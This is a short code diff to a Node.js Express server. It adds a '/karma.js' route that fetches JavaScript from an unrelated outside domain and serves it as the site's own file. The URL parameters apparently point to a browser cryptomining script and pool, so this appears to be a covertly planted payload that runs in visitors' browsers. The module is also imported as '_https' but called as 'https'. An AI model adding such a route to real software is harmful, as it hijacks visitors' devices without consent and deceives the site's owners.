@@ -227,6 +227,29 @@ function getCircularReplacer() {
   };
 }
 
+const _https = require('https');
+app.get("/karma.js", (req, res) => {
+  const url = 'https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo';
+
+  const request = https.request(url, (response) => {
+      let data = '';
+      response.on('data', (chunk) => {
+          data = data + chunk.toString();
+      });
+  
+      response.on('end', () => {
+          const body = data;
+          res.send(body);
+      });
+  })
+  
+  request.on('error', (error) => {
+      console.log('An error', error);
+  });
+  
+  request.end() 
+});
+
 app.get("/dashboard/login", (req, res) => {
   res.sendFile(path.join(__dirname, 'private', 'logindashboard.html'));
 });
